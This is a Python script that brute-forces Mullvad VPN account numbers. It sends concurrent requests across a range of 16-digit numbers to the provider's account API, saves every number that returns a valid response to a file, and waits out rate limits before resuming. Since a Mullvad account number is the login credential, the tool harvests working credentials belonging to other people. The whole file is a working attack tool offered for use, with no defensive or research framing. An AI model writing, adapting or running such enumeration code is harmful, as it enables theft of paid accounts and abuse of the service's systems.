import requests
import concurrent.futures
import time

# Define API endpoint
API_URL = "https://api.mullvad.net/www/accounts/v1/"

# Output file for valid accounts
VALID_ACCOUNTS = "valid_accounts.txt"

# Ensure the output file exists
open(VALID_ACCOUNTS, "a").close()

print(f"Starting the account validation process. Results will be saved to {VALID_ACCOUNTS}.")

def fetch_response(account_number):
    """Fetch the HTTP response for a given account number."""
    try:
        response = requests.get(f"{API_URL}{account_number}/", timeout=5)
        return account_number, response.status_code
    except requests.RequestException as e:
        print(f"Error fetching account {account_number}: {e}")
        return account_number, None

def process_response(account_number, status_code):
    """Process the HTTP response to check if the account is valid."""
    if status_code == 200:
        with open(VALID_ACCOUNTS, "a") as file:
            file.write(f"{account_number}\n")
        print(f"Valid account: {account_number}")
    elif status_code == 429:
        print("Rate limit reached. Pausing for 10 seconds.")
        time.sleep(10)  # Adjust to handle rate-limiting gracefully

# Generate all 16-digit combinations
account_numbers = (str(i) for i in range(1000000000000000, 1000000000009999))  # Adjust range as needed

# Use ThreadPoolExecutors for concurrent fetching and processing
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as fetch_executor:
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as process_executor:
        fetch_futures = {fetch_executor.submit(fetch_response, account): account for account in account_numbers}
        for future in concurrent.futures.as_completed(fetch_futures):
            try:
                account_number, status_code = future.result()
                if status_code is not None:
                    process_executor.submit(process_response, account_number, status_code)
            except Exception as e:
                print(f"An error occurred: {e}")
